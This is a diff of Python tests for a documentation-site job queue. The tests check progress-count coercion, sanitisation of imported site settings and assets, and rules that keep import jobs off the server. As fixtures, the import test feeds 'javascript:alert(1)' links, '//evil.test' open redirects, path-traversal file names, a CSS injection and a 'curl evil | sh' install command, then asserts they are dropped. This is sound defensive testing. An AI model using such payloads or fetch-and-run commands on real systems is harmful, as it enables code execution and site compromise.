@@ -329,6 +329,22 @@ class QueueTests(DbCase):
         self.assertTrue(await docs_jobs.complete(self.db, j1["_id"], "w1", {"ok": True}))
         self.assertEqual((await docs_jobs.claim_next(self.db, "w3"))["_id"], j2["_id"])
 
+    async def test_progress_counts_are_coerced_not_a_500(self):
+        s = await self.make_site()
+        j = await self.job("build", s, target="local")
+        await docs_jobs.claim_next(self.db, "w1")
+        for done, total, want in (("abc", [1], (0, 0)), (float("nan"), float("inf"), (0, 0)), (True, None, (0, 0)),
+                                  (-5, 10**12, (0, 10**9)), (3.7, "4", (3, 0)), (2, 5, (2, 5))):
+            self.assertTrue(await docs_jobs.set_progress(self.db, j["_id"], "w1", {"step": "x", "done": done, "total": total}))
+            p = (await self.db[JOBS].find_one({"_id": j["_id"]}))["progress"]
+            self.assertEqual((p["done"], p["total"]), want)
+        # Through the runner API: a bad count is a 200 with the count as 0, never a 500.
+        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t") as http:
+            r = await http.post(f"/api/v1/internal/docs-jobs/{j['_id']}/progress",
+                                json={"runner": "w1", "done": "lots", "total": {"x": 1}},
+                                headers={"authorization": f"Bearer {docs_jobs.job_token(j['_id'])}"})
+        self.assertEqual(r.status_code, 200, r.text)
+
     async def test_expired_lock_is_reclaimed_then_exhausted(self):
         s = await self.make_site()
         j = await self.job("import", s, target="local")
@@ -601,6 +617,67 @@ class ImportTests(DbCase):
         self.assertEqual((await self.db[PAGES].find_one({"_id": a["_id"]}))["draft"]["rev"], 2)
         self.assertEqual(await self.db[PAGES].count_documents({"site_id": s["_id"]}), 3)
 
+    async def test_imported_site_data_and_files_are_checked(self):
+        s = await self.make_site()
+        await self.job("import", s, {"source": "gitbook", "url": "https://x.test"}, target="local")
+        job = await docs_jobs.claim_next(self.db, "w1")
+        data = self.data()
+        data["site"].update({
+            "home": {"start": [{"page": "/g/a", "icon": "zap", "title": "T"}, {"page": "//evil.test/x"},
+                               {"page": "javascript:alert(1)"}, "junk"],
+                     "askPlaceholder": "Search", "install": {"title": "x", "commands": {"sh": "curl evil | sh"}}},
+            "pages": {"showDescription": True, "icons": "yes", "extra": 1},
+            "footer": [{"label": "llms.txt", "href": "/llms.txt"}, {"label": "Evil", "href": "javascript:alert(1)"},
+                       {"label": "Site", "href": "https://acme.test/"}, {"label": "Http", "href": "http://acme.test/"}],
+            "tabs": [{"id": "guide", "label": "Guide", "href": "/g/a"}, {"id": "x", "label": "X", "href": "/\\evil.test"}],
+            "embed_hosts": ["www.youtube.com", "evil.test", "WWW.FIGMA.COM", 3],
+        })
+        data["site"]["brand"].update({"favicon": "javascript:alert(1)", "og": {"background": "red;}", "accent": "#abc", "mark": "x"}})
+        data["redirects"] = {"/x": "/g/a", "/y": "//evil.test", "/z": "/\\evil.test", "/w": "javascript:alert(1)",
+                             "/v": "https://acme.test/new#a", "/u": "http://acme.test/", "/t": "/a\nb", "nope": "/g/a",
+                             "/s?q=1": "/g/a", "/r": "/g/a#anchor"}
+        data["videos"] = {"intro": {"url": "https://www.youtube-nocookie.com/embed/abc", "title": "Intro"},
+                          "bad": {"url": "javascript:alert(1)", "src": "/docs-assets/../x.mp4"},
+                          "../x": {"url": "https://www.youtube.com/x"},
+                          "local": {"src": "/docs-assets/import/v/a.mp4", "poster": "https://evil.test/p.png"}}
+        data["nav"] = [{"group": "Getting started", "pages": ["/g/a", ["x"]]}, "junk", {"group": "N", "pages": "x"}]
+        data["assets"]["items"] += [
+            {"rel": "import/g/a/page.html", "size": 5, "sha256": "c" * 64},
+            {"rel": "import/g/a/pic.svg", "size": 5, "sha256": "d" * 64},
+            {"rel": "import/g/a/x.xhtml", "size": 5, "sha256": "e" * 64},
+            {"rel": "import/g/a/doc.pdf", "size": 5, "sha256": "f" * 64, "content_type": "text/html"},
+            {"rel": "import/../escape.png", "size": 5, "sha256": "1" * 64},
+            {"rel": "import/.hidden/x.png", "size": 5, "sha256": "2" * 64},
+            {"rel": "elsewhere/x.png", "size": 5, "sha256": "3" * 64},
+            {"rel": "import/g/a/neg.png", "size": -1, "sha256": "4" * 64},
+            {"rel": "import/g/a/bool.png", "size": True, "sha256": "5" * 64},
+            {"rel": "import/g/a/float.png", "size": 5.0, "sha256": "6" * 64},
+            {"rel": "import/g/a/sha.png", "size": 5, "sha256": "Z" * 64},
+            {"rel": "import/g/a/clip.mp4", "size": 7, "sha256": "7" * 64},
+            "junk"]
+        data["assets"]["files"] = float("inf")
+        out = await docs_import_job.apply_import(self.db, job, "w1", data)
+        self.assertTrue(out["ok"])
+        self.assertNotIn("files", out["assets"])
+        x = (await self.db[SITES].find_one({"_id": s["_id"]}))["engine_extra"]
+        self.assertEqual(x["home"], {"start": [{"page": "/g/a", "icon": "zap", "title": "T"}], "askPlaceholder": "Search"})
+        self.assertEqual(x["pages"], {"showDescription": True})
+        self.assertEqual(x["footer"], [{"label": "llms.txt", "href": "/llms.txt"}, {"label": "Site", "href": "https://acme.test/"}])
+        self.assertEqual(x["tabs"], [{"id": "guide", "label": "Guide", "href": "/g/a"}])
+        self.assertEqual(x["embed_hosts"], ["www.figma.com", "www.youtube.com"])
+        self.assertEqual(x["brand"], {"logo_alt": "S", "logo_tile": True, "og": {"accent": "#abc"}})
+        self.assertEqual(x["redirects"], {"/x": "/g/a", "/v": "https://acme.test/new#a", "/r": "/g/a#anchor"})
+        self.assertEqual(x["videos"], {"intro": {"url": "https://www.youtube-nocookie.com/embed/abc", "title": "Intro"},
+                                       "local": {"src": "/docs-assets/import/v/a.mp4"}})
+        rows = [r async for r in self.db[ASSETS].find({"site_id": s["_id"]}).sort("name", 1)]
+        self.assertEqual([(r["name"], r["content_type"]) for r in rows],
+                         [("import/brand/logo.png", "image/png"), ("import/g/a/clip.mp4", "video/mp4"),
+                          ("import/g/a/doc.pdf", "application/pdf"), ("import/g/a/shot.png", "image/png")])
+        for rel, want in (("import/a/b.JPEG", "image/jpeg"), ("import/a.webm", "video/webm"), ("import/a.svg", None),
+                          ("import/a.html", None), ("import/a.js", None), ("import/a.xml", None), ("import/a", None),
+                          ("import/a.png/", None), ("import/a.png?x", None), (None, None), ("x.png", None)):
+            self.assertEqual(docs_import_job.import_asset_type(rel), want, rel)
+
     async def test_bad_brand_is_dropped_not_fatal(self):
         s = await self.make_site()
         job = await self.job("import", s, {"source": "gitbook", "url": "https://x"}, target="local")
@@ -621,29 +698,52 @@ class DispatchTests(DbCase):
         imp = await self.job("import", s, {"source": "gitbook", "url": "https://docs.x"})
         build = await self.job("build", s)
 
-        async def small(url):
-            return 12
-
-        async def big(url):
-            return 300
-
         self.assertEqual((await docs_dispatch.choose_target(self.db, restore))[0], "local")
         self.assertEqual((await docs_dispatch.choose_target(self.db, unpub))[0], "local")
-        self.assertEqual((await docs_dispatch.choose_target(self.db, imp, probe=small))[0], "local")
-        # Actions not configured: big imports and builds fall back to the server.
-        self.assertEqual(await docs_dispatch.choose_target(self.db, imp, probe=big), ("local", "actions unavailable: the builder repo isn't configured"))
+        # Actions not configured: builds fall back to the server; an import never does (it waits).
+        self.assertEqual(await docs_dispatch.choose_target(self.db, imp),
+                         (None, "imports run on GitHub Actions, which is unavailable: the builder repo isn't configured"))
         self.assertEqual((await docs_dispatch.choose_target(self.db, build))[1], "fallback: the builder repo isn't configured")
         with mock.patch.object(JS, "docs_builder_repo", "o/r"), mock.patch.object(JS, "docs_builder_token", "t"):
-            self.assertEqual((await docs_dispatch.choose_target(self.db, imp, probe=big))[0], "actions")
+            self.assertEqual((await docs_dispatch.choose_target(self.db, imp))[0], "actions")
             self.assertEqual((await docs_dispatch.choose_target(self.db, build))[0], "actions")
-            # The month's minutes are used up → local.
+            # The month's minutes are used up → builds go local, imports wait.
             await self.job("build", s, status="done", target="actions", finished_at=utc(), actions_minutes=1800)
             ok, why = await docs_dispatch.actions_status(self.db)
             self.assertFalse(ok)
             self.assertIn("minutes", why)
             self.assertEqual((await docs_dispatch.choose_target(self.db, build))[0], "local")
+            self.assertIsNone((await docs_dispatch.choose_target(self.db, imp))[0])
         with mock.patch.object(JS, "docs_build_targets", "actions"):
             self.assertEqual((await docs_dispatch.choose_target(self.db, build))[0], None)
+        with mock.patch.object(JS, "docs_build_targets", "local"):
+            self.assertEqual((await docs_dispatch.choose_target(self.db, imp))[0], None)
+
+    async def test_imports_never_run_on_the_server(self):
+        s = await self.make_site()
+        imp = await self.job("import", s, {"source": "gitbook", "url": "https://docs.x"})
+        legacy = await self.job("import", await self.make_site("old"), {"source": "gitbook", "url": "https://docs.y"},
+                                target="local")
+        # Actions unavailable: both wait, unrouted, saying why; the local worker can't claim them.
+        await docs_dispatch.run_once(self.db)
+        for j in (imp, legacy):
+            row = await self.db[JOBS].find_one({"_id": j["_id"]})
+            self.assertEqual((row["status"], row.get("target")), ("queued", None))
+            self.assertIn("imports run on GitHub Actions", row["route_reason"])
+        self.assertIsNone(await docs_jobs.claim_next(self.db, "w1"))
+        # Never picked up: failed with the reason.
+        await self.db[JOBS].update_one({"_id": imp["_id"]}, {"$set": {"created_at": utc(minutes=-JS.docs_job_queued_timeout_minutes - 1)}})
+        await docs_dispatch.run_once(self.db)
+        row = await self.db[JOBS].find_one({"_id": imp["_id"]})
+        self.assertEqual(row["status"], "failed")
+        self.assertIn("imports run on GitHub Actions, which is unavailable", row["error"])
+        # Actions back: the waiting import is dispatched there.
+        client = httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(204)))
+        with mock.patch.object(JS, "docs_builder_repo", "o/r"), mock.patch.object(JS, "docs_builder_token", "t"), \
+                mock.patch.object(JS, "docs_job_secret", SECRET):
+            await docs_dispatch.run_once(self.db, client=client)
+        row = await self.db[JOBS].find_one({"_id": legacy["_id"]})
+        self.assertEqual((row["target"], row["dispatch_attempts"]), ("actions", 1))
 
     async def test_dispatch_and_fallback(self):
         s = await self.make_site()
